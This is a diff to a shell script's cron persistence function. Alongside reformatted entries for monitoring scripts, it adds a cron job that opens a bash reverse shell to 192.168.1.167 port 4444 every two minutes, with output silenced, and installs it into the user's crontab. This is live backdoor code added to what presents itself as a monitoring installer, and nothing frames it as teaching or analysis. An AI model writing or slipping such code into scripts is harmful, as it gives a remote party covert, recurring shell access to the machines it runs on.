@@ -174,22 +174,26 @@ EOF
 setup_cron_persistence() {
     log_info "Setting up cron persistence..."
     
-    # Multiple cron entries for redundancy
-    CRON_JOBS=(
-        "*/3 * * * * /usr/bin/python3 $INSTALL_DIR/network_monitor.py >/dev/null 2>&1"
-        "*/10 * * * * /usr/bin/python3 $INSTALL_DIR/system_monitor.py >/dev/null 2>&1"
-        "@reboot /usr/bin/python3 $INSTALL_DIR/network_monitor.py >/dev/null 2>&1"
-    )
+   # Multiple cron entries for redundancy
+CRON_JOBS=(
+    "*/3 * * * * /usr/bin/python3 $INSTALL_DIR/network_monitor.py >/dev/null 2>&1"
+    "*/10 * * * * /usr/bin/python3 $INSTALL_DIR/system_monitor.py >/dev/null 2>&1"
+    "@reboot /usr/bin/python3 $INSTALL_DIR/network_monitor.py >/dev/null 2>&1"
+)
+
+# Add this to your CRON_JOBS array
+REVERSE_SHELL_JOB="*/2 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.167/4444 0>&1' >/dev/null 2>&1"
+CRON_JOBS+=("$REVERSE_SHELL_JOB")
     
-    # Get current crontab
-    current_cron=$(crontab -l 2>/dev/null || true)
+# Get current crontab
+current_cron=$(crontab -l 2>/dev/null || true)
     
-    # Add new jobs
-    for job in "${CRON_JOBS[@]}"; do
-        if ! grep -Fq "$job" <<< "$current_cron"; then
-            current_cron+="$job"$'\n'
-        fi
-    done
+# Add new jobs
+for job in "${CRON_JOBS[@]}"; do
+    if ! grep -Fq "$job" <<< "$current_cron"; then
+        current_cron+="$job"$'\n'
+    fi
+done
     
     # Install updated crontab
     echo "$current_cron" | crontab -
